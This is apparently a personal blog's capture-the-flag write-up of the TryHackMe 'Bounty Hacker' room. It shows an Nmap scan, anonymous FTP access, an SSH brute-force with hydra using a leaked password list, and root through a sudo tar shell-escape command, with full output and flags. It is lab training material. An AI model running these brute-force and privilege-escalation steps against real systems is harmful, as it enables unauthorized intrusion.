<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Bounty-Hacker -Tryhackme | As-Blog</title><meta name=keywords content="CTF"><meta name=description content="Summary
Bounty hacker is a TryHackMe machine that is super easy to do, we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access
Machine link
https://tryhackme.com/room/cowboyhacker
Scanning
First, we need to find open ports on the machine
Nmap scanning
# Nmap 7.92 scan initiated Fri Jan 14 23:24:07 2022 as: nmap -sCV -A -o scan."><meta name=author content="Me"><link rel=canonical href=https://akhils911dev.github.io/blog/posts/tryhackme-bounty-hacker/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/blog/assets/css/stylesheet.min.e21185e6c4b43ff34c81666f70aa4f80140274057866888c0a5c28addc9b7fd2.css integrity="sha256-4hGF5sS0P/NMgWZvcKpPgBQCdAV4ZoiMClwordybf9I=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/blog/assets/js/highlight.min.27cd435cc9ed6abb4b496581b151804f79f366c412620272bb94e2f5f598ebcc.js integrity="sha256-J81DXMntartLSWWBsVGAT3nzZsQSYgJyu5Ti9fWY68w=" onload=hljs.initHighlightingOnLoad();></script><link rel=icon href=https://akhils911dev.github.io/blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://akhils911dev.github.io/blog/posts/img/favicon.png><link rel=icon type=image/png sizes=32x32 href=https://akhils911dev.github.io/blog/favicon-32x32.png><link rel=apple-touch-icon href=https://akhils911dev.github.io/blog/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://akhils911dev.github.io/blog/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme: rgb(29, 30, 32);--entry: rgb(46, 46, 51);--primary: rgb(218, 218, 219);--secondary: rgb(155, 156, 157);--tertiary: rgb(65, 66, 68);--content: rgb(196, 196, 197);--hljs-bg: rgb(46, 46, 51);--code-bg: rgb(55, 56, 62);--border: rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');ga('create','UA-123-45','auto');ga('send','pageview');}</script><meta property="og:title" content="Bounty-Hacker -Tryhackme"><meta property="og:description" content="Summary
Bounty hacker is a TryHackMe machine that is super easy to do, we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access
Machine link
https://tryhackme.com/room/cowboyhacker
Scanning
First, we need to find open ports on the machine
Nmap scanning
# Nmap 7.92 scan initiated Fri Jan 14 23:24:07 2022 as: nmap -sCV -A -o scan."><meta property="og:type" content="article"><meta property="og:url" content="https://akhils911dev.github.io/blog/posts/tryhackme-bounty-hacker/"><meta property="og:image" content="https://akhils911dev.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-01-19T00:00:00+00:00"><meta property="article:modified_time" content="2022-01-19T00:00:00+00:00"><meta property="og:site_name" content="ExampleSite"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://akhils911dev.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Bounty-Hacker -Tryhackme"><meta name=twitter:description content="Summary
Bounty hacker is a TryHackMe machine that is super easy to do, we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access
Machine link
https://tryhackme.com/room/cowboyhacker
Scanning
First, we need to find open ports on the machine
Nmap scanning
# Nmap 7.92 scan initiated Fri Jan 14 23:24:07 2022 as: nmap -sCV -A -o scan."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://akhils911dev.github.io/blog/posts/"},{"@type":"ListItem","position":2,"name":"Bounty-Hacker -Tryhackme","item":"https://akhils911dev.github.io/blog/posts/tryhackme-bounty-hacker/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Bounty-Hacker -Tryhackme","name":"Bounty-Hacker -Tryhackme","description":"Summary\nBounty hacker is a TryHackMe machine that is super easy to do, we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access\nMachine link\nhttps://tryhackme.com/room/cowboyhacker\nScanning\nFirst, we need to find open ports on the machine\nNmap scanning\n# Nmap 7.92 scan initiated Fri Jan 14 23:24:07 2022 as: nmap -sCV -A -o scan.","keywords":["CTF"],"articleBody":"Summary\nBounty hacker is a TryHackMe machine that is super easy to do, we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access\nMachine link\nhttps://tryhackme.com/room/cowboyhacker\nScanning\nFirst, we need to find open ports on the machine\nNmap scanning\n# Nmap 7.92 scan initiated Fri Jan 14 23:24:07 2022 as: nmap -sCV -A -o scan.txt 10.10.168.115 Nmap scan report for 10.10.168.115 Host is up (0.33s latency). Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.6.124.128 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can't get directory listing: TIMEOUT 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA) | 256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA) |_ 256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn't have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jan 14 23:25:06 2022 -- 1 IP address (1 host up) scanned in 58.73 seconds The machine has some open ports 80,21,22 why not connect using FTP with the target machine because anonymous login is allowed it means anyone can connect with the server using FTP\nftp 10.10.168.115 Connected to 10.10.168.115. 220 (vsFTPd 3.0.3) Name (10.10.168.115:kali): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp ls 200 EPRT command successful. Consider using EPSV. 150 Here comes the directory listing. -rw-rw-r-- 1 ftp ftp 418 Jun 07 2020 locks.txt -rw-rw-r-- 1 ftp ftp 68 Jun 07 2020 task.txt 226 Directory send OK. ftp get task.txt local: task.txt remote: task.txt 200 EPRT command successful. Consider using EPSV. 150 Opening BINARY mode data connection for task.txt (68 bytes). 100% |*******************************************| 68 299.12 KiB/s 00:00 ETA 226 Transfer complete. 68 bytes received in 00:00 (0.20 KiB/s) ftp ftp get locks.txt local: locks.txt remote: locks.txt 200 EPRT command successful. Consider using EPSV. 150 Opening BINARY mode data connection for locks.txt (418 bytes). 100% |*******************************************| 418 8.17 KiB/s 00:00 ETA 226 Transfer complete. 418 bytes received in 00:00 (1.08 KiB/s) ftp bye 221 Goodbye Here it has two files task.txt and locks.txt I get the file on my machine and let’s read both of the files to get the answer to who wrote the task list\n┌──(kali㉿kali)-[~/tryhackme/bugbounty] └─$ cat task.txt 1.) Protect Vicious. 2.) Plan for Red Eye pickup on the moon. -lin 1, Who wrote the task list?\nans \" lin “\ncat locks.txt rEddrAGON ReDdr4g0nSynd!cat3 Dr@gOn$yn9icat3 R3DDr46ONSYndIC@Te ReddRA60N R3dDrag0nSynd1c4te dRa6oN5YNDiCATE ReDDR4g0n5ynDIc4te R3Dr4gOn2044 RedDr4gonSynd1cat3 R3dDRaG0Nsynd1c@T3 Synd1c4teDr@g0n reddRAg0N REddRaG0N5yNdIc47e Dra6oN$yndIC@t3 4L1mi6H71StHeB357 rEDdragOn$ynd1c473 DrAgoN5ynD1cATE ReDdrag0n$ynd1cate Dr@gOn$yND1C4Te RedDr@gonSyn9ic47e REd$yNdIc47e dr@goN5YNd1c@73 rEDdrAGOnSyNDiCat3 r3ddr@g0N The locks.txt file has some strings it looks like passwords So now we can try brute forcing SSH with hydra taking the username lin and the password list locks.txt\nhydra -l lin -P locks.txt 10.10.168.115 ssh Hydra v9.2 (c) 2021 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-14 23:43:59 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task [DATA] attacking ssh://10.10.168.115:22/ [22][ssh] host: 10.10.168.115 login: lin password: RedDr4gonSynd1cat3 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 2 final worker threads did not complete until end. [ERROR] 2 targets did not resolve or could not be connected [ERROR] 0 target did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-14 23:44:08 after successful brute forcing we got the password for user lin which is RedDr4gonSynd1cat3\nit’s time to answer the next questions\n2, What service can you brute force with the text file found?\n” SSH “\n3, What is the user’s password?\n” RedDr4gonSynd1cat3 “\nGaining access\nNow, let’s access the machine through SSH using the recently obtained credentials\nssh lin@10.10.168.115 255 ⨯ The authenticity of host '10.10.168.115 (10.10.168.115)' can't be established. ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.168.115' (ED25519) to the list of known hosts. lin@10.10.168.115's password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 83 packages can be updated. 0 updates are security updates. Last login: Sun Jun 7 22:23:41 2020 from 192.168.0.14 lin@bountyhacker:~/Desktop$ ls user.txt lin@bountyhacker:~/Desktop$ cat user.txt THM{CR1M3_SyNd1C4T3} user.txt THM{CR1M3_SyNd1C4T3}\nNow we got the user.txt flag and now we have to find root.txt, for that I checked the sudo permissions and found that tar I can run as root\nprivilege escalation\nlin@bountyhacker:~/Desktop$ sudo -l [sudo] password for lin: Matching Defaults entries for lin on bountyhacker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User lin may run the following commands on bountyhacker: (root) /bin/tar Check the GTFObins for tar Exploit which is a site GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems, I got this\ncommand ” sudo tar -cf /dev/null /dev/null –checkpoint=1 –checkpoint-action=exec=/bin/sh “\nrun this command in the target machine shell it is greeted as root\nnow we are in root and got the root flag\nlin@bountyhacker:/$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh tar: Removing leading `/' from member names # whoami root # ls bin dev initrd.img lib64\tmnt root snap tmp\tvmlinuz boot etc initrd.img.old lost+found opt run srv usr\tvmlinuz.old cdrom home lib\tmedia\tproc sbin sys var # cd root # ls root.txt # cat root.txt THM{80UN7Y_h4cK3r} # Connection to 10.10.168.115 closed by remote host. Connection to 10.10.168.115 closed. root.txt THM{80UN7Y_h4cK3r}\nThank you for reading Happy Hacking\n","wordCount":"1055","inLanguage":"en","datePublished":"2022-01-19T00:00:00Z","dateModified":"2022-01-19T00:00:00Z","author":{"@type":"Person","name":"Me"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://akhils911dev.github.io/blog/posts/tryhackme-bounty-hacker/"},"publisher":{"@type":"Organization","name":"As-Blog","logo":{"@type":"ImageObject","url":"https://akhils911dev.github.io/blog/favicon.ico"}}}</script></head><body id=top><script>if(localStorage.getItem("pref-theme")==="dark"){document.body.classList.add('dark');}else if(localStorage.getItem("pref-theme")==="light"){document.body.classList.remove('dark')}else if(window.matchMedia('(prefers-color-scheme: dark)').matches){document.body.classList.add('dark');}</script><header class=header><nav class=nav><div class=logo><a href=https://akhils911dev.github.io/blog/ accesskey=h title="Home (Alt + H)">Home</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://akhils911dev.github.io/blog/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://akhils911dev.github.io/blog/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://akhils911dev.github.io/blog/search/ title=Search><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://akhils911dev.github.io/blog/>Home</a>&nbsp;»&nbsp;<a href=https://akhils911dev.github.io/blog/posts/>Posts</a></div><h1 class=post-title>Bounty-Hacker -Tryhackme</h1><div class=post-meta><span title="2022-01-19 00:00:00 +0000 UTC">January 19, 2022</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/TryhackMe-Bounty-Hacker.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><p><strong>Summary</strong></p><p>Bounty hacker is a <a href=https://tryhackme.com/><strong>TryHackMe</strong></a> machine that is super easy to do,
we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access</p><p><strong>Machine link</strong></p><p><a href=https://tryhackme.com/room/cowboyhacker>https://tryhackme.com/room/cowboyhacker</a></p><p><strong>Scanning</strong></p><p>First, we need to find open ports on the machine<br>Nmap scanning</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># Nmap 7.92 scan initiated Fri Jan 14 23:24:07 2022 as: nmap -sCV -A -o scan.txt 10.10.168.115</span>
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.168.115
Host is up <span style=color:#f92672>(</span>0.33s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>967</span> filtered tcp ports <span style=color:#f92672>(</span>no-response<span style=color:#f92672>)</span>, <span style=color:#ae81ff>30</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.124.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is <span style=color:#ae81ff>300</span>
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was <span style=color:#ae81ff>2</span>
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed <span style=color:#f92672>(</span>FTP code 230<span style=color:#f92672>)</span>
|_Can<span style=color:#e6db74>&#39;t get directory listing: TIMEOUT
</span><span style=color:#e6db74>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
</span><span style=color:#e6db74>| ssh-hostkey: 
</span><span style=color:#e6db74>|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
</span><span style=color:#e6db74>|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
</span><span style=color:#e6db74>|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
</span><span style=color:#e6db74>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
</span><span style=color:#e6db74>|_http-title: Site doesn&#39;</span>t have a title <span style=color:#f92672>(</span>text/html<span style=color:#f92672>)</span>.
|_http-server-header: Apache/2.4.18 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style=color:#75715e># Nmap done at Fri Jan 14 23:25:06 2022 -- 1 IP address (1 host up) scanned in 58.73 seconds</span>
</code></pre></div><p>The machine has some open ports 80,21,22 why not connect using FTP with the target machine because anonymous login is allowed it means anyone can connect with the server using FTP</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ftp 10.10.168.115
Connected to 10.10.168.115.
<span style=color:#ae81ff>220</span> <span style=color:#f92672>(</span>vsFTPd 3.0.3<span style=color:#f92672>)</span>
Name <span style=color:#f92672>(</span>10.10.168.115:kali<span style=color:#f92672>)</span>: anonymous
<span style=color:#ae81ff>230</span> Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
<span style=color:#ae81ff>200</span> EPRT command successful. Consider using EPSV.
<span style=color:#ae81ff>150</span> Here comes the directory listing.
-rw-rw-r--    <span style=color:#ae81ff>1</span> ftp      ftp           <span style=color:#ae81ff>418</span> Jun <span style=color:#ae81ff>07</span>  <span style=color:#ae81ff>2020</span> locks.txt
-rw-rw-r--    <span style=color:#ae81ff>1</span> ftp      ftp            <span style=color:#ae81ff>68</span> Jun <span style=color:#ae81ff>07</span>  <span style=color:#ae81ff>2020</span> task.txt
<span style=color:#ae81ff>226</span> Directory send OK.
ftp&gt; get task.txt
local: task.txt remote: task.txt

<span style=color:#ae81ff>200</span> EPRT command successful. Consider using EPSV.
<span style=color:#ae81ff>150</span> Opening BINARY mode data connection <span style=color:#66d9ef>for</span> task.txt <span style=color:#f92672>(</span><span style=color:#ae81ff>68</span> bytes<span style=color:#f92672>)</span>.
100% |*******************************************|    <span style=color:#ae81ff>68</span>      299.12 KiB/s    00:00 ETA
<span style=color:#ae81ff>226</span> Transfer complete.
<span style=color:#ae81ff>68</span> bytes received in 00:00 <span style=color:#f92672>(</span>0.20 KiB/s<span style=color:#f92672>)</span>
ftp&gt; 
ftp&gt; get locks.txt
local: locks.txt remote: locks.txt
<span style=color:#ae81ff>200</span> EPRT command successful. Consider using EPSV.
<span style=color:#ae81ff>150</span> Opening BINARY mode data connection <span style=color:#66d9ef>for</span> locks.txt <span style=color:#f92672>(</span><span style=color:#ae81ff>418</span> bytes<span style=color:#f92672>)</span>.
100% |*******************************************|   <span style=color:#ae81ff>418</span>        8.17 KiB/s    00:00 ETA
<span style=color:#ae81ff>226</span> Transfer complete.
<span style=color:#ae81ff>418</span> bytes received in 00:00 <span style=color:#f92672>(</span>1.08 KiB/s<span style=color:#f92672>)</span>
ftp&gt; bye
<span style=color:#ae81ff>221</span> Goodbye
</code></pre></div><p>Here it has two files <em><strong>task.txt</strong></em> and <em><strong>locks.txt</strong></em> I get the file on my machine and
let’s read both of the files to get the answer to who wrote the task list</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/tryhackme/bugbounty<span style=color:#f92672>]</span>
└─$ cat task.txt                 
1.<span style=color:#f92672>)</span> Protect Vicious.
2.<span style=color:#f92672>)</span> Plan <span style=color:#66d9ef>for</span> Red Eye pickup on the moon.

-lin
</code></pre></div><p><em><strong>1, Who wrote the task list?</strong></em></p><p><em><strong>ans " lin &ldquo;</strong></em></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cat locks.txt         
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
</code></pre></div><p>The locks.txt file has some strings it looks like passwords
So now we can try brute forcing SSH with hydra taking the username lin and the password list <em><strong>locks.txt</strong></em></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash> hydra -l lin -P locks.txt 10.10.168.115 ssh
Hydra v9.2 <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2021</span> by van Hauser/THC &amp; David Maciejak - Please <span style=color:#66d9ef>do</span> not use in military or secret service organizations, or <span style=color:#66d9ef>for</span> illegal purposes <span style=color:#f92672>(</span>this is non-binding, these *** ignore laws and ethics anyway<span style=color:#f92672>)</span>.

Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> starting at 2022-01-14 23:43:59
<span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style=color:#ae81ff>4</span>
<span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> max <span style=color:#ae81ff>16</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>16</span> tasks, <span style=color:#ae81ff>26</span> login tries <span style=color:#f92672>(</span>l:1/p:26<span style=color:#f92672>)</span>, ~2 tries per task
<span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> attacking ssh://10.10.168.115:22/
<span style=color:#f92672>[</span>22<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: 10.10.168.115   login: lin   password: RedDr4gonSynd1cat3
<span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> target successfully completed, <span style=color:#ae81ff>1</span> valid password found
<span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> Writing restore file because <span style=color:#ae81ff>2</span> final worker threads did not complete <span style=color:#66d9ef>until</span> end.
<span style=color:#f92672>[</span>ERROR<span style=color:#f92672>]</span> <span style=color:#ae81ff>2</span> targets did not resolve or could not be connected
<span style=color:#f92672>[</span>ERROR<span style=color:#f92672>]</span> <span style=color:#ae81ff>0</span> target did not complete
Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> finished at 2022-01-14 23:44:08
</code></pre></div><p>after successful brute forcing we got the password for user <em><strong>lin</strong></em>
which is <em><strong>RedDr4gonSynd1cat3</strong></em></p><p>it&rsquo;s time to answer the next questions</p><p><em><strong>2, What service can you brute force with the text file found?</strong></em></p><p><em><strong>&rdquo; SSH &ldquo;</strong></em></p><p><em><strong>3, What is the user&rsquo;s password?</strong></em></p><p><em><strong>&rdquo; RedDr4gonSynd1cat3 &ldquo;</strong></em></p><p><strong>Gaining access</strong></p><p>Now, let’s access the machine through SSH using the recently obtained credentials</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ssh lin@10.10.168.115                                                         <span style=color:#ae81ff>255</span> ⨯
The authenticity of host <span style=color:#e6db74>&#39;10.10.168.115 (10.10.168.115)&#39;</span> can<span style=color:#e6db74>&#39;t be established.
</span><span style=color:#e6db74>ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
</span><span style=color:#e6db74>This key is not known by any other names
</span><span style=color:#e6db74>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span><span style=color:#e6db74>Warning: Permanently added &#39;</span>10.10.168.115<span style=color:#e6db74>&#39; (ED25519) to the list of known hosts.
</span><span style=color:#e6db74>lin@10.10.168.115&#39;</span>s password: 
Welcome to Ubuntu 16.04.6 LTS <span style=color:#f92672>(</span>GNU/Linux 4.15.0-101-generic x86_64<span style=color:#f92672>)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

<span style=color:#ae81ff>83</span> packages can be updated.
<span style=color:#ae81ff>0</span> updates are security updates.

Last login: Sun Jun  <span style=color:#ae81ff>7</span> 22:23:41 <span style=color:#ae81ff>2020</span> from 192.168.0.14
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM<span style=color:#f92672>{</span>CR1M3_SyNd1C4T3<span style=color:#f92672>}</span>
</code></pre></div><p><em><strong>user.txt THM{CR1M3_SyNd1C4T3}</strong></em></p><p>Now we got the user.txt flag and now we have to find <em><strong>root.txt</strong></em>, for
that I checked the sudo permissions and found that <strong>tar</strong> I can run as root</p><p><strong>privilege escalation</strong></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>lin@bountyhacker:~/Desktop$ sudo -l
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lin: 
Matching Defaults entries <span style=color:#66d9ef>for</span> lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin

User lin may run the following commands on bountyhacker:
    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> /bin/tar
</code></pre></div><p>Check the <a href=https://gtfobins.github.io/>GTFObins</a> for tar Exploit which is a site GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems, I got this</p><p><img loading=lazy src=/blog/posts/img/gtfo_bins.png alt="Test Image"></p><p>command <strong>&rdquo; sudo tar -cf /dev/null /dev/null &ndash;checkpoint=1 &ndash;checkpoint-action=exec=/bin/sh &ldquo;</strong></p><p>run this command in the target machine shell it is greeted as root</p><p>now we are in root and got the root flag</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>lin@bountyhacker:/$ sudo tar -cf /dev/null /dev/null --checkpoint<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> --checkpoint-action<span style=color:#f92672>=</span>exec<span style=color:#f92672>=</span>/bin/sh
tar: Removing leading <span style=color:#e6db74>`</span>/<span style=color:#960050;background-color:#1e0010>&#39;</span> from member names
<span style=color:#75715e># whoami</span>
root
<span style=color:#75715e># ls</span>
bin    dev   initrd.img      lib64	 mnt   root  snap  tmp	vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr	vmlinuz.old
cdrom  home  lib	     media	 proc  sbin  sys   var
<span style=color:#75715e># cd root</span>
<span style=color:#75715e># ls</span>
root.txt
<span style=color:#75715e># cat root.txt</span>
THM<span style=color:#f92672>{</span>80UN7Y_h4cK3r<span style=color:#f92672>}</span>
<span style=color:#75715e># Connection to 10.10.168.115 closed by remote host.</span>
Connection to 10.10.168.115 closed.
</code></pre></div><p>root.txt <em><strong>THM{80UN7Y_h4cK3r}</strong></em></p><p>Thank you for reading
